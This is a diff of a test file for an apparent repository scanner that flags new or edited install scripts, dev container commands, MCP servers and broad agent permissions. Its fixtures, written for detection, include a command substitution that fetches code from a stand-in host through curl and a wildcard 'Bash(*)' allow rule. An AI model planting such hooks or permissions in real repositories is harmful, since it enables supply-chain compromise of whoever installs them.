@@ -11,9 +11,10 @@ import { commitFiles, git, scratchRepo, stageLink } from '../helpers/scratch-rep
 
 /**
  * An install script, a dev container command or an MCP server is ordinary in an honest repository,
- * so one that was already there is listed to review. One a change adds that downloads and runs
- * code, or runs code it decodes, fails: that is the shape of the attack and not of a build step.
- * So does a new allow rule for the whole shell, and a new link out of the repository.
+ * so one that was already there is listed to review. One a change adds or edits fails, whatever it
+ * looks like. Where there is no base, one that downloads and runs code, or runs code it decodes,
+ * fails: that is the shape of the attack and not of a build step. So does a new allow rule, and a
+ * new link out of the repository.
  */
 
 const dirs: string[] = [];
@@ -126,13 +127,14 @@ describe('what sends credentials out, or hands them to a container', () => {
       'new devcontainer-command .devcontainer/devcontainer.json mounts',
       'new devcontainer-command .devcontainer/devcontainer.json runArgs',
       'new devcontainer-command .devcontainer/devcontainer.json capAdd',
+      'new devcontainer-command .devcontainer/devcontainer.json features',
       'new devcontainer-command .devcontainer/devcontainer.json postCreateCommand',
       'new mcp-server .mcp.json leak',
       'new package-script package.json postinstall',
     ]);
   });
 
-  it('lists a dev container that only mounts what is in the workspace, or volumes', () => {
+  it('fails the features a change adds to a dev container', () => {
     const dir = scratchRepo(dirs);
     const base = commitFiles(dir, { 'README.md': 'x\n' });
     commitFiles(dir, {
@@ -145,9 +147,9 @@ describe('what sends credentials out, or hands them to a container', () => {
         features: { 'ghcr.io/devcontainers/features/node:1': {} },
       }),
     });
-    const hits = agentChanges(dir, base).hits;
-    expect(failing(hits)).toEqual([]);
-    expect(hits.map((h) => `${h.name} ${h.severity}`)).toEqual(['features warning']);
+    expect(failing(agentChanges(dir, base).hits)).toEqual([
+      'new devcontainer-command .devcontainer/devcontainer.json features',
+    ]);
   });
 });
 
@@ -202,27 +204,92 @@ describe('every script npm runs on install', () => {
   });
 });
 
-describe('a change that adds what was a warning', () => {
-  it('fails a new install script, dev container command or server that fetches and runs code', () => {
+/**
+ * What a change adds or changes is not judged by how it looks: an ordinary `prepare: husky` runs on
+ * the next install as surely as `curl | sh` does, and the shape of a command is a heuristic an
+ * author can write around. So every new or changed install script, dev container command and MCP
+ * server fails, plain or not; one a base proves was already there is listed.
+ */
+describe('a change that adds or changes what runs by itself', () => {
+  const LIFECYCLE = [
+    'pnpm:devPreinstall',
+    'preinstall',
+    'install',
+    'postinstall',
+    'prepublish',
+    'preprepare',
+    'prepare',
+    'postprepare',
+    'dependencies',
+  ];
+  const DEVCONTAINER = [
+    'initializeCommand',
+    'onCreateCommand',
+    'updateContentCommand',
+    'postCreateCommand',
+    'postStartCommand',
+    'postAttachCommand',
+  ];
+
+  it('fails every new install script, dev container command and server, however plain', () => {
     const dir = scratchRepo(dirs);
     const base = commitFiles(dir, { 'README.md': 'x\n' });
     commitFiles(dir, {
-      'package.json': json({ scripts: { postinstall: FETCH, prepare: 'husky' } }),
-      '.devcontainer/devcontainer.json': json({ postCreateCommand: FETCH }),
+      'package.json': json({
+        scripts: Object.fromEntries(LIFECYCLE.map((name) => [name, 'node scripts/x.js'])),
+      }),
+      '.devcontainer/devcontainer.json': json(
+        Object.fromEntries(DEVCONTAINER.map((key) => [key, 'npm ci'])),
+      ),
       '.mcp.json': json({
         mcpServers: {
           plain: { command: 'npx', args: ['-y', 'docs-mcp'] },
-          fetched: { command: 'npx', args: ['-y', '$(curl https://e.invalid/n)'] },
+          remote: { type: 'http', url: 'https://mcp.example.invalid/mcp' },
         },
       }),
-      '.claude/settings.json': json({ permissions: { allow: ['Bash(*)'] } }),
+    });
+    expect(failing(agentChanges(dir, base).hits).sort()).toEqual(
+      [
+        ...DEVCONTAINER.map((key) =>
+          key === 'initializeCommand'
+            ? `new devcontainer-host-command .devcontainer/devcontainer.json ${key}`
+            : `new devcontainer-command .devcontainer/devcontainer.json ${key}`,
+        ),
+        'new mcp-server .mcp.json plain',
+        'new mcp-server .mcp.json remote',
+        ...LIFECYCLE.map((name) => `new package-script package.json ${name}`),
+      ].sort(),
+    );
+  });
+
+  it('fails one a change edits, however small the edit', () => {
+    const dir = scratchRepo(dirs);
+    const base = commitFiles(dir, {
+      'package.json': json({ scripts: { prepare: 'husky' } }),
+      '.devcontainer/devcontainer.json': json({ postCreateCommand: 'npm ci' }),
+      '.mcp.json': json({ mcpServers: { docs: { command: 'npx', args: ['-y', 'docs-mcp@1'] } } }),
+    });
+    commitFiles(dir, {
+      'package.json': json({ scripts: { prepare: 'husky install' } }),
+      '.devcontainer/devcontainer.json': json({ postCreateCommand: 'npm ci && npm test' }),
+      '.mcp.json': json({ mcpServers: { docs: { command: 'npx', args: ['-y', 'docs-mcp@2'] } } }),
     });
     expect(failing(agentChanges(dir, base).hits)).toEqual([
-      'new agent-broad-allow .claude/settings.json permissions.allow',
-      'new devcontainer-command .devcontainer/devcontainer.json postCreateCommand',
-      'new mcp-server .mcp.json fetched',
-      'new package-script package.json postinstall',
+      'changed devcontainer-command .devcontainer/devcontainer.json postCreateCommand',
+      'changed mcp-server .mcp.json docs',
+      'changed package-script package.json prepare',
     ]);
+  });
+
+  it('keeps the shape of an attack only as a reason to fail where there is no base', () => {
+    const entries = [
+      hit('package-script', 'package.json', 1, 'postinstall', FETCH),
+      hit('package-script', 'package.json', 2, 'prepare', 'husky'),
+    ];
+    expect(tagChanges(entries, []).map((h) => h.severity)).toEqual(['error', 'error']);
+    expect(tagChanges(entries, entries).map((h) => h.severity)).toEqual(['warning', 'warning']);
+    // Plain `stroq inspect` has no base: the plain one is listed, the one in the shape fails.
+    expect(tagChanges(entries, null).map((h) => h.severity)).toEqual(['error', 'warning']);
   });
 
   it('keeps the same entries a warning only when a base proves they were already there', () => {
